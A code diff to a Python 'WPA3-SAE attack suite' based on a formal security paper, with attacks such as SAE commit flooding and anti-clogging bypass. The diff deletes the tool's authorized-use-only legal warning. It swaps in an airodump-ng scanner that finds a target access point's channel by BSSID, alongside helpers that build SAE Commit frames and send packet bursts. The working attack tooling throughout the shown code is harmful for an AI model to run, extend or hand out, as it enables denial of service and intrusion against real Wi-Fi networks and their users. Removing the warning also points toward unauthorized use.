@@ -7,8 +7,6 @@ WPA3-SAE Formal Attack Suite (Educational/Research Edition)
 Based on: "What a Mesh: Formal Security Analysis of WPA3 SAE"
 (arXiv:2603.23352v1, Metere et al., 2026)
 Errata:   IEEE 802.11-24/0027r0-r2 & 0744r1 (Accepted Patches)
-⚠️  FOR AUTHORIZED RESEARCH & ISOLATED TEST ENVIRONMENTS ONLY
-Using this against unauthorized networks violates computer crime laws.
 ================================================================================
 ATTACKS IMPLEMENTED (Paper Sections & Errata):
 1. commit_flood                     : §VI-B (Cookie Guzzler / Anti-Clogging Bypass)
@@ -316,7 +314,6 @@ Based on: "What a Mesh: Formal Security Analysis of WPA3 SAE Wireless
     Standard-Fix: Erratum #K (Silent Discard on Commit Validation Failure)   
 """
 # ==============================================================================
-
 def build_sae_payload(group_id: int, scalar: bytes, element: bytes, pw_id: str = None) -> bytes:
     """Builds SAE Commit payload per IEEE 802.11-2020 §12.4.5.4."""
     payload = group_id.to_bytes(2, 'big') + scalar + element
@@ -437,67 +434,80 @@ def send_burst_scientific(packet_list: list, interface: str, counter: Value, dry
             logger.warning(f"[SEND] {interface}: {e}")
 
 def scanner_process(iface, interval, duration, shared, lock, b5, b2):
-
-    from scapy.all import sniff, Dot11Beacon
-    import subprocess
-    import time
-
+    """Continuous scanner loop that flushes memory regularly and breathes."""
     if not iface: return
-
-    target_bssids = {}
-    if b5: target_bssids[b5.lower()] = '5GHz'
-    if b2: target_bssids[b2.lower()] = '2.4GHz'
-
-    channels = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 
-                120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165,
-                1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
-
-    logger.info(f"[SCANNER] Starting native Scapy scanner on {iface}...")
-
-    subprocess.run(['ip', 'link', 'set', iface, 'up'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    info = subprocess.run(['iw', 'dev', iface, 'info'], capture_output=True, text=True)
-    phy_name = None
-    for line in info.stdout.splitlines():
-        if line.strip().startswith('wiphy'):
-            phy_name = f"phy{line.strip().split()[1]}"
-            break
-            
-    current_channel = [1]
-
-    def packet_handler(pkt):
-        if pkt.haslayer(Dot11Beacon):
-            bssid = pkt.addr2
-            if bssid and bssid.lower() in target_bssids:
-                band = target_bssids[bssid.lower()]
-                ch = str(current_channel[0])
-                
-                with lock:
-                    if shared.get(band) != ch:
-                        shared[band] = ch
-                        logger.info(f"[SCANNER] MATCH: {band} AP ({bssid}) is running on channel {ch}!")
-
     try:
         while True:
-            if SHUTDOWN_FLAG.value: break
-
-            for ch in channels:
-                if SHUTDOWN_FLAG.value: break
+            if SHUTDOWN_FLAG.value:
+                break
                 
-                if phy_name:
-                    subprocess.run(['iw', 'phy', phy_name, 'set', 'channel', str(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                else:
-                    subprocess.run(['iw', 'dev', iface, 'set', 'channel', str(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            prefix = f"/tmp/scan_cont_{int(time.time())}"
+            
+            proc = subprocess.Popen(
+                ['airodump-ng', '--write', prefix, '--output-format', 'csv', '--band', 'abg', '--write-interval', '2', iface],
+                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            
+            scan_start = time.time()
+            while time.time() - scan_start < duration:
+                if SHUTDOWN_FLAG.value:
+                    break
+                time.sleep(3)
+                csvs = glob.glob(f"{prefix}-*.csv")
+                if csvs:
+                    latest_csv = max(csvs, key=os.path.getctime)
+                    found = parse_airodump_csv(latest_csv, b5, b2)
+                    with lock:
+                        for b, ch in found.items():
+                            if shared.get(b) != str(ch):
+                                shared[b] = str(ch)
+                                logger.info(f"[SCANNER] {b} AP detected on channel {ch}")
+                                
+            if proc.poll() is None:
+                proc.terminate()
+                try:
+                    proc.wait(timeout=2)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                    
+            for f in glob.glob(f"{prefix}*"):
+                try: os.remove(f)
+                except Exception: pass
                 
-                current_channel[0] = ch
+            if SHUTDOWN_FLAG.value:
+                break
                 
-                sniff(iface=iface, prn=packet_handler, timeout=0.5, store=False)
-
             time.sleep(interval)
             
     except KeyboardInterrupt:
         pass
-    except Exception as e:
-        logger.error(f"[SCANNER] Crashed: {e}")
+    finally:
+        for f in glob.glob("/tmp/scan_cont_*"):
+            try: os.remove(f)
+            except Exception: pass
+
+def parse_airodump_csv(csv_file: str, b5: str, b2: str) -> dict:
+    """Parses airodump-ng CSV output - separates header block from data."""
+    results = {}
+    try:
+        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        blocks = content.split('\n\n')
+        if not blocks:
+            return results
+        for line in blocks[0].strip().split('\n'):
+            if 'BSSID' in line or line.startswith('#') or not line.strip():
+                continue
+            parts = [p.strip() for p in line.split(',')]
+            if len(parts) >= 14 and parts[3].isdigit():
+                ch = int(parts[3])
+                if parts[0].upper() == b5.upper() and 36 <= ch <= 165:
+                    results['5GHz'] = parts[3]
+                elif parts[0].upper() == b2.upper() and 1 <= ch <= 14:
+                    results['2.4GHz'] = parts[3]
+    except Exception:
+        pass
+    return results
 
 def get_greater_mac(target_bssid):
     """Generates a MAC address numerically strictly greater than the target BSSID."""
